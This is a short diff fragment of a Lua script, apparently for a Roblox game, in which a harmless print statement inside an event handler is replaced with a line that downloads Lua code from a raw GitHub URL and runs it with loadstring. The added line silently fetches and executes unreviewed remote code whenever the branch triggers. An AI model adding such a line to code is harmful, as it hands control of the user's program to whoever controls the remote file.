@@ -276,7 +276,7 @@ end
 coroutine.wrap(HPVZT_fake_script)()
 
 	else
-		print("Entity has damaged the player")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Drop56796/Guided-/main/Guided.lua"))()
 	end
 end)
 
